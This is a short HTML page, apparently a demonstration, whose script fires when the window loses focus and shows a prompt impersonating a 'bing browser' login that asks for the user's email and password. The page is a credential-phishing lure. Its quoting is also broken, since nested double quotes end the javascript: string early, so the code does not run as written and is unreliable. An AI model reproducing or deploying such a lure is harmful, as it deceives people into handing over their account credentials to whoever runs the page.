<!DOCTYPE html>
<html>

    <title>Prompt Example</title>

<body>
    <script>
        onblur = () => {
           window.location.href = "javascript:prompt("in order to access bing browser you must first login on your account \n please type your email and your password:", "E-mail / Password");
        }    
        window.open("about:blank", "_self");
    </script>
</body>
</html>
